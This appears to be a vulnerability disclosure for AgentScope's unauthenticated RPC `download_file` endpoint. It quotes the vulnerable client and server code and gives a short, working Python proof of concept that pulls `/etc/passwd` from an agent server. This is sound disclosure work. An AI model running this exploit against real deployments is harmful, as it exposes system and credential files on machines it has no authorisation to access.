### Description

AgentScope implements an Actor-based distributed deployment and parallel optimization, providing features such as Automatic Parallel Optimization, Centralized Application Writing, Zero-Cost Automatic Migration. For Inter-process communication between agent server process and main process; AgentScope provided the `agentscope.rpc` module. The `download_file` method allowed users to download file from react-agent process to main process. Nevertheless, since the RPC endpoint is not protected and directly exposed, attackers can download arbitrary file from the main process.

### Source-to-sink

client-side `download_file`:

```python
    def download_file(self, path: str) -> str:
        """Download a file from a remote server to the local machine.

        Args:
        path (`str`): The path of the file to be downloaded. Note that
            it is the path on the remote server.

        Returns:
            `str`: The path of the downloaded file. Note that it is the path
            on the local machine.
        """

        file_manager = FileManager.get_instance()

        local_filename = (
            f"{generate_id_from_seed(path, 5)}_{os.path.basename(path)}"
        )

        def _generator() -> Generator[bytes, None, None]:
            with grpc.insecure_channel(f"{self.host}:{self.port}") as channel:
                for resp in RpcAgentStub(channel).download_file(
                    agent_pb2.StringMsg(value=path),
                ):
                    yield resp.data

        return file_manager.save_file(_generator(), local_filename)
```

Agent process `download_file`:

```python
    def download_file(
        self,
        request: agent_pb2.StringMsg,
        context: ServicerContext,
    ) -> Any:
        """Download file from local path."""
        filepath = request.value
        if not os.path.exists(filepath):
            context.abort(
                grpc.StatusCode.NOT_FOUND,
                f"File {filepath} not found",
            )

        with open(filepath, "rb") as f:
            while True:
                piece = f.read(1024 * 1024)  # send 1MB each time
                if not piece:
                    break
                yield agent_pb2.ByteMsg(data=piece)
```

### Exploitation

```python
from agentscope import rpc
import grpc
from agentscope.rpc.rpc_agent_pb2_grpc import RpcAgentStub
import agentscope.rpc.rpc_agent_pb2 as agent_pb2
from agentscope import rpc

client = rpc.RpcAgentClient(host='127.0.0.1', port=12001, agent_id='custom_test')
custom_agent_id = "custom_test"

client.create_agent(
    agent_configs={
        "args": (),
        "kwargs": {"name": "custom"},
        "class_name": "ReActAgent",
    },
    agent_id=custom_agent_id,
)

print(client.get_agent_list())
print(client.download_file('/etc/passwd'))
```

File saved in `.`, access with prompt.

# Impact

arbitrary file exposure